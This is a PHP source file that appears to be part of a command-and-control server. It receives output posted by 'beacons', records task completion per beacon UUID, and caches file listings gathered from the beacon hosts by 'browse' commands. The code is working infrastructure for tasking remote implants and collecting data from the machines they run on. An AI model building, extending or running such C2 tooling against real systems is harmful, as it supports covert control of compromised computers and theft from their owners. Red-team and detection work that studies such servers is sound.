<?php
declare(strict_types=1);

function handleResult(): void {
    $db = DB::connect();
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        validateBeaconSecret();
        $input = jsonInput();
        $taskId = intval($input['task_id'] ?? 0);
        $uuid = trim($input['beacon_uuid'] ?? '');
        $output = $input['output'] ?? '';
        $status = $input['status'] ?? 'completed';
        if (empty($taskId) || empty($uuid)) jsonError('Missing task_id or beacon_uuid');
        $db->insert('results', ['task_id' => $taskId, 'beacon_uuid' => $uuid, 'output' => $output, 'status' => $status, 'created_at' => now()]);
        $db->update('tasks', 'id', $taskId, ['status' => 'completed', 'completed_at' => now()]);
        $task = $db->findOne('tasks', 'id', $taskId);
        if ($task && str_starts_with($task['command'] ?? '', 'browse ')) {
            $path = trim(substr($task['command'], 7));
            $parsed = json_decode($output, true);
            if ($parsed && isset($parsed['files'])) {
                $entries = json_encode($parsed['files']); $n = now();
                $ex = $db->findFirst('browse_cache', ['beacon_uuid' => $uuid, 'path' => $path]);
                if ($ex) $db->update('browse_cache', 'id', $ex['id'], ['entries' => $entries, 'updated_at' => $n]);
                else $db->insert('browse_cache', ['beacon_uuid' => $uuid, 'path' => $path, 'entries' => $entries, 'updated_at' => $n]);
            }
        }
        jsonOut(['status' => 'received']);
    } else { handleListResults(); }
}

function handleListResults(): void {
    $db = DB::connect();
    $taskId = isset($_GET['task_id']) ? intval($_GET['task_id']) : null;
    $uuid = $_GET['beacon_uuid'] ?? null;
    $results = $db->all('results');
    if ($taskId) $results = array_values(array_filter($results, fn($r) => ($r['task_id'] ?? 0) === $taskId));
    if ($uuid) $results = array_values(array_filter($results, fn($r) => ($r['beacon_uuid'] ?? '') === $uuid));
    usort($results, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
    jsonOut($results);
}
